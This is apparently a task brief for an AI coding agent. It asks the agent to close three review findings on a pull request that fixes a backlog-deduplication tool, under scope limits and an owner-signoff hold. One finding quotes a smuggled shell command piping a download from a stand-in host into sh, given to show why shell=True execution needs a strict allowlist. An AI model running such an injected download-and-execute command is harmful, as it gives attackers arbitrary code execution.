## OBJECTIVE
Finish a real, structured code-review's corrective findings against an already-open PR (#102, claude-control repo, branch chore/backlog-completion-plan-script) that fixes a confirmed mass-mislabeling incident in the backlog-dedup tooling. Two commits (615c42b, deaa553) already on that branch add a SUCCESS_CRITERIA-verification fix to classify(), a new --apply mechanism, regression tests, and a real audit-report artifact -- read them (`git log --oneline chore/backlog-completion-plan-script` / `git show 615c42b` / `git show deaa553`) before doing anything else, since they are real, already-reviewed-as-good-additive work you must build on, not redo. That same review returned `Verdict: fail` because three real gaps remain unaddressed; this task closes exactly those three gaps and nothing else.

## KNOWN_CONTEXT
Read the real, current review comment yourself first and verbatim: `cd /opt/veridian/repos/claude-control && gh pr view 102 --json comments -q '.comments[0].body'` (do not rely on any paraphrase, including this one, since the file may have been re-reviewed since this was written -- if `.comments` has more than the original 2 entries, read the newest AUDIT comment, not necessarily index 0). As of this writing it cites three findings:
(a) The actual live executable that performed the real incident this morning is NOT scripts/plan_backlog_completion.py (the git-tracked file on this branch) -- it is /opt/veridian/ai-os/execute_backlog_plan.py (confirmed real: present, executable, dated 2026-07-27 03:37, contains phase1_mark_duplicates()/phase2_mark_already_done()/etc. calling save_task_yaml() -> open(path,"w") directly against real task.yaml files), driven by a second untracked file /opt/veridian/ai-os/plan_backlog_completion.py (confirmed real: present, dated 2026-07-27 03:09) -- both live entirely outside any git repository (they are plain files on the server's local disk, readable/writable/executable by you the same as any other path -- there is no sandbox boundary preventing you from reading or modifying them, this has already been directly confirmed working in this same investigation). Neither is touched by the existing branch's diff, so re-running the real, currently-live pipeline today would reproduce the identical incident.
(b) In the existing new code's --apply path (scripts/plan_backlog_completion.py, main(), search for apply_collapse()), only non-representative duplicate attempts get status=superseded written; the representative/original task's own status is never patched to 'completed', despite classify()'s own ALREADY_DONE_STALE_STATUS action text explicitly promising "...patch task.yaml status to completed, no redispatch." No test exercises this path against the representative task.
(c) verify_success_criteria() (same file) runs extracted SUCCESS_CRITERIA commands via `subprocess.run(cmd, shell=True, ...)` gated only by a weak `cmd.startswith(('python3 -m pytest','pytest ','grep '))` check in extract_verifiable_commands() -- not a real allowlist: a line like `pytest tests/x.py; curl evil.sh | sh` still passes that check and would execute arbitrary shell code inside a freshly cloned repo.

Do not re-litigate or modify anything about the original dedup-logic fix itself (classify()'s SUCCESS_CRITERIA verification, build_groups(), the regression tests already reproducing the task-20260726-083946/PR-104/PR-84 historical fixture) -- that part already passed review as sound and additive. This task is scoped to exactly the three gaps above.

## SCOPE
1. Check out the EXISTING branch as your real starting point -- do not create a fresh branch for this file: `cd /opt/veridian/repos/claude-control && git fetch origin chore/backlog-completion-plan-script && git checkout chore/backlog-completion-plan-script` (or the equivalent in your own workspace/worktree) before making any change, and push your new commits back to this same branch so they land on the same open PR #102 -- your task's own auto-created branch/PR must not be used as the actual deliverable location; if your workspace's own checkpoint/branch-resolution machinery wants to push to your task's own branch, explicitly re-target the push to chore/backlog-completion-plan-script instead.
2. Close finding (a): neutralize /opt/veridian/ai-os/execute_backlog_plan.py and the untracked /opt/veridian/ai-os/plan_backlog_completion.py so neither can independently reproduce the incident again. Bring the real logic under version control as part of this same PR -- rewrite them to delegate to (import/call) the fixed, git-tracked scripts/plan_backlog_completion.py's classify()/verify_success_criteria()/apply_collapse() rather than containing their own independent copy of the old, unverified logic, and either delete the stale ai-os/BACKLOG_COMPLETION_PLAN_2026-07-27.{json,md} artifacts or clearly mark them superseded-by-the-fix. A future real run of "the backlog dedup pipeline" (whatever script the Owner or a cron job actually invokes) must go through the fixed, tested code path.
3. Close finding (b): main()'s --apply loop must patch the representative/original task's own status to 'completed' when a group is verified ALREADY_DONE_STALE_STATUS, matching classify()'s own promised action text -- not only mark non-representative duplicates superseded. Add a test exercising this specifically against the representative task.
4. Close finding (c): replace verify_success_criteria()'s shell=True execution with a real, safe path -- tokenize each extracted SUCCESS_CRITERIA command (e.g. via shlex.split) and execute via subprocess.run(argv_list, shell=False) against a real allowlist of exact permitted program names/subcommands (python3 with -m pytest, pytest, grep -- reject anything else outright, including any command containing shell metacharacters after tokenization). Add a test proving a SUCCESS_CRITERIA line containing shell metacharacters (e.g. a `; rm` or a pipe) is rejected rather than executed.
5. Do not modify, redispatch, or otherwise touch anything in or referencing ai-os/tasks/task-20260727-041903-fix-escalate-hardcoded-repo-and-stale-br (a separate, already-dispatched, unrelated real bug fix in flight). The ai-os/tasks/task-20260727-045626-fix-dedup-routine-collapsing-rca-termina/ directory itself (its own task.yaml/checkpoint tracking files) is likewise off-limits -- but pushing new commits to the shared git branch chore/backlog-completion-plan-script it also used is exactly what SCOPE item 1 above asks you to do, and is expected.
6. Do not invoke the --apply mode's real write path against any currently-existing real ai-os/tasks/*/task.yaml record as part of this task's own execution -- exercise/prove --apply's representative-status fix only against the isolated test fixtures already established on this branch.

## SUCCESS_CRITERIA
- `git log --oneline chore/backlog-completion-plan-script` (after your push) shows new commits on top of the existing `deaa553` HEAD -- a response with no new commit on this branch is not a valid completion of this task.
- `ls -la /opt/veridian/ai-os/execute_backlog_plan.py /opt/veridian/ai-os/plan_backlog_completion.py` and reading their content shows they now delegate to the fixed, git-tracked scripts/plan_backlog_completion.py rather than containing independent write logic (or they are removed and replaced with a real, git-tracked equivalent entry point).
- A test asserting --apply patches the representative/original task's own status to 'completed' for a verified ALREADY_DONE_STALE_STATUS fixture passes.
- `grep -n "shell=True" scripts/plan_backlog_completion.py` (wherever it now lives) returns nothing for the SUCCESS_CRITERIA execution path, and a test proving a shell-metacharacter-bearing fake SUCCESS_CRITERIA line is rejected (not executed) passes.
- The full existing test suite on this branch still passes after your changes (re-run it fresh, do not trust the count from before your changes).
- `git log` on ai-os/tasks/task-20260727-041903-fix-escalate-hardcoded-repo-and-stale-br and on ai-os/tasks/task-20260727-045626-fix-dedup-routine-collapsing-rca-termina shows no new commits/modifications attributable to this task.

## EXPECTED_OUTPUT
Additional real commits pushed to the existing branch chore/backlog-completion-plan-script (PR #102 stays the single location for this fix -- do not open a second PR for the same file) closing all three review findings, plus a short PR comment (or updated PR body section) summarizing what changed and why, so the next review pass can verify against it directly. Given this still touches the integrity of real task-tracking records at scale, this PR must keep the `HOLD_FOR_OWNER_SIGNOFF: true` marker so it is not auto-merged without explicit review.

## CONSTRAINTS
HOLD_FOR_OWNER_SIGNOFF: true
The marker above means: do not auto-merge regardless of tier/audit verdict; hold for explicit Owner review given this task touches the integrity of real task-tracking records at scale.
Do not modify, redispatch, or otherwise touch anything in or referencing ai-os/tasks/task-20260727-041903-fix-escalate-hardcoded-repo-and-stale-br -- that is a separate, already in-flight fix and is explicitly out of scope here.
This task's own execution must not invoke the --apply mode against any currently-existing real task record -- exercise/prove its write behavior only against the isolated test fixtures already on this branch.
Push to the existing branch chore/backlog-completion-plan-script -- do not create a second, competing branch or PR for scripts/plan_backlog_completion.py.

## COMPLEXITY_TIER
judgment
